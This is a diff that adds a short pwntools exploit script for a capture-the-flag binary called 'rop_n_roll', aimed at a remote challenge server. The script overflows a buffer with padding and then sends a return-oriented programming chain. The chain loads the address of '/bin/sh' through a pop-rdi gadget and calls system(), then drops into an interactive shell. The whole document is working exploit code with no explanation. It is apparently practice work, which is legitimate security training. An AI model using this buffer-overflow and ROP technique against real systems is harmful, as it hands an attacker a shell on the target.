@@ -1,0 +1,24 @@
+from pwn import *
+
+#context.binary = binary = ELF("./rop_n_roll", checksec = False)
+system_address = p64(0x0040117d)
+bin_sh = p64(0x00404048)
+rdi = p64(0x00000000004013a3)
+
+#p = process("./rop_n_roll")
+p = remote("challenge.scy-phy.net", 2013)
+#sleep(1)
+#gdb.attach(p)
+
+first_input = b"A" * 100
+p.sendline(first_input)
+#sleep(1)
+
+second_input = b"B" * 419
+second_input += rdi
+second_input += bin_sh
+second_input += system_address
+
+p.send(second_input)
+#sleep(1)
+p.interactive()
